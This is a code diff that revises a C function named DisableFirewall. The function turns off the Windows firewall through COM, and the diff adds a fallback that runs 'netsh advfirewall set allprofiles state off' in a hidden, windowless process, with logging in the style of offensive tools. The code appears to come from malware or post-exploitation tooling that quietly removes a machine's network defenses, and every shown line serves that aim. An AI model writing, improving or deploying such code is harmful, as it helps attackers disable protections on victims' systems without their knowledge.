@@ -688,48 +688,49 @@ static void DisableFirewall(void) {
         INetFwMgr* pMgr = NULL;
         INetFwPolicy* pPolicy = NULL;
         INetFwProfile* pProfile = NULL;
+        BOOL comOk = FALSE;
 
         hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-        if (FAILED(hr)) {
-            LogMessage(L"[-] Firewall disable FAILED: CoInitializeEx");
-            return;
-        }
-
-        hr = CoCreateInstance(&CLSID_NetFwMgr, NULL, CLSCTX_INPROC_SERVER, &IID_INetFwMgr, (void**)&pMgr);
-        if (FAILED(hr) || !pMgr) {
-            LogMessage(L"[-] Firewall disable FAILED: CoCreateInstance");
+        if (SUCCEEDED(hr)) {
+            hr = CoCreateInstance(&CLSID_NetFwMgr, NULL, CLSCTX_INPROC_SERVER, &IID_INetFwMgr, (void**)&pMgr);
+            if (SUCCEEDED(hr) && pMgr) {
+                hr = pMgr->lpVtbl->get_LocalPolicy(pMgr, &pPolicy);
+                if (SUCCEEDED(hr) && pPolicy) {
+                    hr = pPolicy->lpVtbl->get_CurrentProfile(pPolicy, &pProfile);
+                    if (SUCCEEDED(hr) && pProfile) {
+                        hr = pProfile->lpVtbl->put_FirewallEnabled(pProfile, VARIANT_FALSE);
+                        if (SUCCEEDED(hr)) {
+                            comOk = TRUE;
+                            LogMessage(L"[+] Firewall disabled via COM");
+                        }
+                    }
+                }
+            }
+            if (pProfile) pProfile->lpVtbl->Release(pProfile);
+            if (pPolicy) pPolicy->lpVtbl->Release(pPolicy);
+            if (pMgr) pMgr->lpVtbl->Release(pMgr);
             CoUninitialize();
-            return;
         }
-
-        hr = pMgr->lpVtbl->get_LocalPolicy(pMgr, &pPolicy);
-        if (FAILED(hr) || !pPolicy) {
-            LogMessage(L"[-] Firewall disable FAILED: get_LocalPolicy");
-            pMgr->lpVtbl->Release(pMgr);
-            CoUninitialize();
-            return;
+        if (!comOk) {
+            LogMessage(L"[-] COM firewall disable failed, trying netsh fallback");
+            STARTUPINFOW si = { sizeof(si) };
+            PROCESS_INFORMATION pi;
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+            wchar_t cmd[] = L"netsh advfirewall set allprofiles state off";
+            if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                WaitForSingleObject(pi.hProcess, 30000);
+                DWORD exitCode;
+                GetExitCodeProcess(pi.hProcess, &exitCode);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                wchar_t buf[256];
+                wsprintfW(buf, exitCode == 0 ? L"[+] Firewall disabled via netsh" : L"[-] netsh firewall disable FAILED (exit=%lu)", exitCode);
+                LogMessage(buf);
+            } else {
+                LogMessage(L"[-] Firewall disable FAILED: netsh launch");
+            }
         }
-
-        hr = pPolicy->lpVtbl->get_CurrentProfile(pPolicy, &pProfile);
-        if (FAILED(hr) || !pProfile) {
-            LogMessage(L"[-] Firewall disable FAILED: get_CurrentProfile");
-            pPolicy->lpVtbl->Release(pPolicy);
-            pMgr->lpVtbl->Release(pMgr);
-            CoUninitialize();
-            return;
-        }
-
-        hr = pProfile->lpVtbl->put_FirewallEnabled(pProfile, VARIANT_FALSE);
-        if (FAILED(hr)) {
-            LogMessage(L"[-] Firewall disable FAILED: put_FirewallEnabled");
-        } else {
-            LogMessage(L"[+] Firewall disabled via COM");
-        }
-
-        pProfile->lpVtbl->Release(pProfile);
-        pPolicy->lpVtbl->Release(pPolicy);
-        pMgr->lpVtbl->Release(pMgr);
-        CoUninitialize();
     }
 }
 
